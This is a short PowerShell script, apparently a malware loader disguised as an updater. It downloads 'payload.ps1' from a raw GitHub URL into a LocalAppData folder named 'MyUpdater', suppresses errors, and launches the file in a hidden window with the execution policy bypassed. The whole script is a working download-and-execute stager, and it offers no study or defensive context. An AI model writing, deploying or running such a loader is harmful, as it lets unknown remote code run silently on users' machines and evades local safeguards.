$repoUrl = "https://raw.githubusercontent.com/discosoupy/update/refs/heads/main/payload.ps1"
$localFolder = "$env:LOCALAPPDATA\MyUpdater"
$payloadPath = "$localFolder\payload.ps1"

if (!(Test-Path $localFolder)) {
    New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
}

# Payload neu laden
try {
    Invoke-WebRequest -Uri $repoUrl -OutFile $payloadPath -UseBasicParsing
}
catch {}

# Payload ausführen
if (Test-Path $payloadPath) {
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
}

